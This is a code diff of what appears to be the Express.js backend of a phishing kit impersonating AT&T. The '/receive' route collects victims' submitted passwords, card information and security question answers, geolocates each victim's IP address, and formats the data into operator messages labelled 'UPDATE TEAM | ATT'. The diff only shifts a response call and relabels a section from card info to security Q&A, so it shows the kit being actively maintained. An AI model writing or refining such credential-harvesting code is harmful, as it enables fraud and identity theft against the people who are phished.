@@ -102,7 +102,7 @@ app.get('/login/4', async (req, res) => {
 app.post('/receive', async (req, res) => {
   let message = '';
   let myObject = req.body;
-  res.send('mv');
+  
 
   const sendAPIRequest = async (ipAddress) => {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
@@ -119,6 +119,7 @@ app.post('/receive', async (req, res) => {
 	console.log(myObjects);
 
   if (myObjects.includes('Password')) {
+  	res.send('mv'); 
     message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
                `👤 ${myObject['visitor']}\n\n`;
 
@@ -168,7 +169,7 @@ res.send('dn');
   
   if (myObjects.includes('message')) {
     message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO\n\n`;
+               `👤 SECURITY Q & A\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
